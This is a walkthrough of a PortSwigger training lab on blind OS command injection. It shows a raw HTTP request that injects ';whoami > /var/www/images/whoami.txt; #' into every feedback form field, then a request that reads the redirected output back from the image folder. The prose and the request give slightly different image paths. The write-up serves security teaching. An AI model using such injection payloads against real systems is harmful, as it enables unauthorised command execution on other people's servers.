# [Lab 3: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

---

## Description

This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

`/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output.

---

## Solution

Navigate to the feedback function at `/feedback`. It contains a form with four inputs: `name`, `email`, `subject`, and `message`.

![](images/Pasted%20image%2020210819183324.png)

It is unknown which of, or in what order, these arguments are passed to the shell command. Thus, inject into all four and terminate them with a comment indicator (`#`). This way, which ever argument is first will comment out all the rest.

The objective of the challenge is to execute the `whoami` command. Since the output of the command isn't in the HTTP response, redirect the output to `/var/www/images/whoami.txt`.

```http
POST /feedback/submit HTTP/1.1
Host: ac5c1ff31ec290d680c37fc9006200f0.web-security-academy.net
Cookie: session=A7qFNhDNbj6Ook4fOAC1cNg5Ctfltqtd
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://ac5c1ff31ec290d680c37fc9006200f0.web-security-academy.net
Dnt: 1
Referer: https://ac5c1ff31ec290d680c37fc9006200f0.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=wnAcZp4tDvrgSYNqcJsurav2gF3XTHRj&name=;whoami+>+/var/www/images/whoami.txt;+#&email=;whoami+>+/var/www/images/whoami.txt;+#&subject=;whoami+>+/var/www/images/whoami.txt;+#&message=;whoami+>+/var/www/images/whoami.txt;+#
```

Attempt to navigate to the photo. Notice that the photos of the products on the homepage are rendered as `img` tags whose `src` attributes are set to `/images?filename=$FILENAME`. By navigating to `/images?filename=whoami.txt`, it is possible to read the output of the command.

```http
GET /image?filename=whoami.txt HTTP/1.1
Host: ac5c1ff31ec290d680c37fc9006200f0.web-security-academy.net
Cookie: session=A7qFNhDNbj6Ook4fOAC1cNg5Ctfltqtd
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```

```txt
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 12

peter-jesSSz
```

The current user is `peter-jesSSz`.
